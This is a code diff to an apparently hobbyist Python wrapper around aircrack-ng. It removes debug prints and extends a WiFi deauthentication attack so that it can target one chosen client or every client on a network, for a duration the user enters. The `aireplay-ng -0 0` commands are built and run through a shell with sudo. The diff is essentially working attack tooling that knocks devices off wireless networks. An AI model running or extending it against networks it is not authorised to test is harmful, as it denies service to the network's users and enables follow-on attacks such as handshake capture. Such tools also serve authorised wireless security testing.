@@ -133,11 +133,8 @@ class aircrack:
     def filter_station(network: airodumpNet, station_array: [airodumpStation]):
         result_array = []
         for station in station_array:
-            print("a",station.BSSID)
-            print("b",network.BSSID)
             if station.BSSID == network.BSSID:
                 result_array.append(station)
-        print("RESULT", result_array)
         return result_array
 
     def aireplay_attack():
@@ -146,27 +143,50 @@ class aircrack:
         station_array = aircrack.search_station()
         select_station_array = aircrack.filter_station(select_network, station_array)
         if len(select_station_array) > 0:
-            for station in select_station_array:
-                ap.deauth_attack(select_network, station)
+            station_select = aircrack.show_station_List(select_station_array)
+            if station_select is None:
+                ap.deauth_attack(select_network)
+            else:
+                for station in station_select:
+                    ap.deauth_attack(select_network, station)
         else:
             print("0 station in network")
 
+    def show_station_List(stations: [airodumpStation]):
+        for station in stations:
+            print(stations.index(station), station.MAC)
+        select_station = input("Select attacking station or '*' to attack all stations\n")
+        if select_station == "*":
+            return None
+        else:
+            a = int(select_station)
+            if a is not None:
+                return [stations[a]]
+            else:
+                print("Select Error")
+
 class aireplay:
 
-    def deauth_attack(self, net: airodumpNet, station: airodumpStation):
+    def deauth_attack(self, net: airodumpNet, station: airodumpStation = None):
         self.change_channel(net)
-        cmd = ('sudo aireplay-ng -0 0 -a %s -c %s %s' %  (net.BSSID, station.MAC, config.get_actual_interface()))
+        cmd = ""
+        attack_time = int(input("input attack time\n"))
+        if station is not None:
+            cmd = ('sudo aireplay-ng -0 0 -a %s -c %s %s' %  (net.BSSID, station.MAC, config.get_actual_interface()))
+        else:
+            cmd = ('sudo aireplay-ng -0 0 -a %s %s' %  (net.BSSID, config.get_actual_interface()))
         print(cmd)
-        result = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        out, err = result.communicate()
-        time.sleep(20)
-        result.kill()
+        pro = subprocess.Popen(cmd,
+                               stdout=subprocess.PIPE,
+                               shell=True,
+                               preexec_fn=os.setsid)
+        time.sleep(attack_time)
+        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
 
     def change_channel(self, net: airodumpNet):
         cmd = ('sudo iwconfig %s channel %s' % (config.get_actual_interface(), net.channel))
         print(cmd)
         subprocess.call(cmd, shell=True)
-
 
 
 
